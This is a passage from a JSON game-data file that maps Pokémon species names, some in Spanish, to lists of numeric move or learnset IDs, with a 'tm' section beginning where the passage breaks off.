4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78], "dewpider": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 33, 34, 35, 81, 82], "araquanid": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 33, 34, 35, 81, 82], "fomantis": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "lurantis": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "morelull": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 46, 47, 96, 97, 98], "salandit": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76, 6, 7, 8, 9, 59, 62, 67], "salazzle": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76, 6, 7, 8, 9, 59, 62, 67], "stufful": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 40, 41, 88, 89, 90], "bewear": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 40, 41, 88, 89, 90], "bounsweet": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "steenee": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "tsareena": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "comfey": [46, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 47, 96, 97, 98], "passimian": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90], "wimpod": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 10, 11, 12, 13, 63, 68], "golisopod": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 10, 11, 12, 13, 63, 68], "sandygast": [43, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 42, 64, 91, 92, 25, 32, 53, 55, 77, 78], "palossand": [43, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 42, 64, 91, 92, 25, 32, 53, 55, 77, 78], "pyukumuku": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "type: null": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "silvally": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "minior": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 26, 27, 61, 79, 80], "komala": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "turtonator": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67, 44, 45, 93, 94, 95], "togedemaru": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73, 48, 49, 58, 99, 100], "mimikyu": [43, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 42, 64, 91, 92, 46, 47, 96, 97, 98], "bruxish": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 21, 22, 23, 54, 74, 75], "drampa": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 44, 45, 93, 94, 95], "dhelmise": [43, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 42, 64, 91, 92, 14, 15, 16, 17, 69, 70, 71], "jangmo-o": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95], "hakamo-o": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95, 40, 41, 88, 89, 90], "kommo-o": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95, 40, 41, 88, 89, 90], "tapu koko": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73, 46, 47, 96, 97, 98], "tapu lele": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75, 46, 47, 96, 97, 98], "tapu bulu": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 46, 47, 96, 97, 98], "tapu fini": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 46, 47, 96, 97, 98], "cosmog": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "cosmoem": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "solgaleo": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75, 48, 49, 58, 99, 100], "lunala": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75, 42, 43, 64, 91, 92], "nihilego": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 24, 30, 31, 56, 76], "buzzwole": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 40, 41, 88, 89, 90], "pheromosa": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 40, 41, 88, 89, 90], "xurkitree": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73], "celesteela": [48, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 49, 58, 99, 100, 26, 27, 61, 79, 80], "kartana": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 48, 49, 58, 99, 100], "guzzlord": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102, 44, 45, 93, 94, 95], "necrozma": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "magearna": [48, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 49, 58, 99, 100, 46, 47, 96, 97, 98], "marshadow": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90, 42, 43, 64, 91, 92], "poipole": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76], "naganadel": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76, 44, 45, 93, 94, 95], "stakataka": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 48, 49, 58, 99, 100], "blacephalon": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67, 42, 43, 64, 91, 92], "zeraora": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73], "meltan": [48, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 49, 58, 99, 100], "melmetal": [48, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 49, 58, 99, 100], "grookey": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "thwackey": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "rillaboom": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "scorbunny": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "raboot": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "cinderace": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "sobble": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "drizzile": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "inteleon": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "skwovet": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "greedent": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "rookidee": [26, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 27, 61, 79, 80], "corvisquire": [26, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 27, 61, 79, 80], "corviknight": [26, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 27, 61, 79, 80, 48, 49, 58, 99, 100], "blipbug": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82], "dottler": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 21, 22, 23, 54, 74, 75], "orbeetle": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 21, 22, 23, 54, 74, 75], "nickit": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102], "thievul": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102], "gossifleur": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "eldegoss": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "wooloo": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "dubwool": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "chewtle": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "drednaw": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 36, 37, 83, 84, 85], "yamper": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73], "boltund": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73], "applin": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 44, 45, 93, 94, 95], "flapple": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 44, 45, 93, 94, 95], "appletun": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 44, 45, 93, 94, 95], "silicobra": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78], "sandaconda": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78], "cramorant": [26, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 27, 61, 79, 80, 10, 11, 12, 13, 63, 68], "arrokuda": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "barraskewda": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "toxel": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73, 24, 30, 31, 56, 76], "toxtricity": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73, 24, 30, 31, 56, 76], "sizzlipede": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67, 33, 34, 35, 81, 82], "centiskorch": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67, 33, 34, 35, 81, 82], "clobbopus": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90], "grapploct": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90], "sinistea": [43, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 42, 64, 91, 92], "polteageist": [43, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 42, 64, 91, 92], "hatenna": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "hattrem": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "hatterene": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75, 46, 47, 96, 97, 98], "impidimp": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102, 46, 47, 96, 97, 98], "morgrem": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102, 46, 47, 96, 97, 98], "grimmsnarl": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102, 46, 47, 96, 97, 98], "obstagoon": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102], "perrserker": [48, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 49, 58, 99, 100], "cursola": [43, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 42, 64, 91, 92], "runerigus": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78, 42, 43, 64, 91, 92], "milcery": [46, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 47, 96, 97, 98], "alcremie": [46, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 47, 96, 97, 98], "pincurchin": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73], "snom": [38, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 39, 57, 86, 87, 33, 34, 35, 81, 82], "frosmoth": [38, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 39, 57, 86, 87, 33, 34, 35, 81, 82], "stonjourner": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85], "eiscue": [38, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 39, 57, 86, 87], "indeedee": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "morpeko": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73, 50, 51, 52, 101, 102], "dracozolt": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73, 44, 45, 93, 94, 95], "arctozolt": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73, 38, 39, 57, 86, 87], "dracovish": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 44, 45, 93, 94, 95], "arctovish": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 38, 39, 57, 86, 87], "duraludon": [48, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 49, 58, 99, 100, 44, 45, 93, 94, 95], "dreepy": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95, 42, 43, 64, 91, 92], "drakloak": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95, 42, 43, 64, 91, 92], "dragapult": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95, 42, 43, 64, 91, 92], "zacian": [46, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 47, 96, 97, 98], "zamazenta": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90], "eternatus": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76, 44, 45, 93, 94, 95], "kubfu": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90], "urshifu": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90, 50, 51, 52, 101, 102], "regieleki": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73], "regidrago": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95], "glastrier": [38, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 39, 57, 86, 87], "spectrier": [43, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 42, 64, 91, 92], "calyrex": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75, 14, 15, 16, 17, 69, 70, 71], "wyrdeer": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 21, 22, 23, 54, 74, 75], "kleavor": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 36, 37, 83, 84, 85], "ursaluna": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78], "basculegion": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 42, 43, 64, 91, 92], "sneasler": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90, 24, 30, 31, 56, 76], "overqwil": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102, 24, 30, 31, 56, 76], "enamorus": [46, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 47, 96, 97, 98, 26, 27, 61, 79, 80], "sprigatito": [15, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 14, 16, 17, 69, 70, 71], "floragato": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "meowscarada": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 50, 51, 52, 101, 102], "fuecoco": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "crocalor": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "skeledirge": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67, 42, 43, 64, 91, 92], "quaxly": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "quaxwell": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "quaquaval": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 40, 41, 88, 89, 90], "lechonk": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "oinkologne": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "tarountula": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82], "spidops": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82], "nymble": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82], "lokix": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 50, 51, 52, 101, 102], "pawmi": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73], "pawmo": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73, 40, 41, 88, 89, 90], "pawmot": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73, 40, 41, 88, 89, 90], "tandemaus": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "maushold": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "fidough": [46, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 47, 96, 97, 98], "dachsbun": [46, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 47, 96, 97, 98], "smoliv": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "arboliva": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "nacli": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85], "naclstack": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85], "garganacl": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85], "charcadet": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "armarouge": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67, 21, 22, 23, 54, 74, 75], "ceruledge": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67, 42, 43, 64, 91, 92], "tadbulb": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73], "bellibolt": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73], "wattrel": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73, 26, 27, 61, 79, 80], "kilowattrel": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73, 26, 27, 61, 79, 80], "bramblin": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 42, 43, 64, 91, 92], "capsakid": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "scovillain": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 6, 7, 8, 9, 59, 62, 67], "rellor": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82], "flittle": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "tinkatink": [46, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 47, 96, 97, 98, 48, 49, 58, 99, 100], "tinkatuff": [46, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 47, 96, 97, 98, 48, 49, 58, 99, 100], "tinkaton": [46, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 47, 96, 97, 98, 48, 49, 58, 99, 100], "wiglett": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "wugtrio": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "finizen": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "palafin": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "varoom": [48, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 49, 58, 99, 100, 24, 30, 31, 56, 76], "revavroom": [48, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 49, 58, 99, 100, 24, 30, 31, 56, 76], "cyclizar": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95], "orthworm": [48, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 49, 58, 99, 100], "glimmet": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 24, 30, 31, 56, 76], "glimmora": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 24, 30, 31, 56, 76], "greavard": [43, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 42, 64, 91, 92], "houndstone": [43, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 42, 64, 91, 92], "cetoddle": [38, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 39, 57, 86, 87], "cetitan": [38, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 39, 57, 86, 87], "veluza": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 21, 22, 23, 54, 74, 75], "dondozo": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "tatsugiri": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95, 10, 11, 12, 13, 63, 68], "annihilape": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90, 42, 43, 64, 91, 92], "clodsire": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76, 25, 32, 53, 55, 77, 78], "farigiraf": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 21, 22, 23, 54, 74, 75], "dudunsparce": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "kingambit": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102, 48, 49, 58, 99, 100], "colmilargo": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78, 40, 41, 88, 89, 90], "colagrito": [46, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 47, 96, 97, 98, 21, 22, 23, 54, 74, 75], "melenaleteo": [43, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 42, 64, 91, 92, 46, 47, 96, 97, 98], "reptalada": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 40, 41, 88, 89, 90], "pelarena": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73, 25, 32, 53, 55, 77, 78], "ferrosaco": [38, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 39, 57, 86, 87, 10, 11, 12, 13, 63, 68], "ferropalmas": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90, 18, 19, 20, 72, 73], "ferropolilla": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67, 24, 30, 31, 56, 76], "ferropúas": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 18, 19, 20, 72, 73], "frigibax": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95, 38, 39, 57, 86, 87], "arctibax": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95, 38, 39, 57, 86, 87], "baxcalibur": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95, 38, 39, 57, 86, 87], "gholdengo": [48, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 49, 58, 99, 100, 42, 43, 64, 91, 92], "chi-yu": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102, 6, 7, 8, 9, 59, 62, 67], "bramaluna": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95, 50, 51, 52, 101, 102], "ferropaladín": [46, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 47, 96, 97, 98, 40, 41, 88, 89, 90], "koraidon": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90, 44, 45, 93, 94, 95], "ondulagua": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 44, 45, 93, 94, 95], "ferroverdor": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 21, 22, 23, 54, 74, 75], "dipplin": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 44, 45, 93, 94, 95], "poltchageist": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 42, 43, 64, 91, 92], "sinistcha": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 42, 43, 64, 91, 92], "munkidori": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76, 21, 22, 23, 54, 74, 75], "fezandipiti": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76, 46, 47, 96, 97, 98], "ogerpon": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "archaludon": [48, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 49, 58, 99, 100, 44, 45, 93, 94, 95], "hydrapple": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 44, 45, 93, 94, 95], "terapagos": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66] }, "tm": { "venusaur": [32], "charmander": [94, 45, 48, 95, 37, 83], "charmeleon": [94, 45, 95, 37, 83], "charizard": [32, 94, 45, 95, 37, 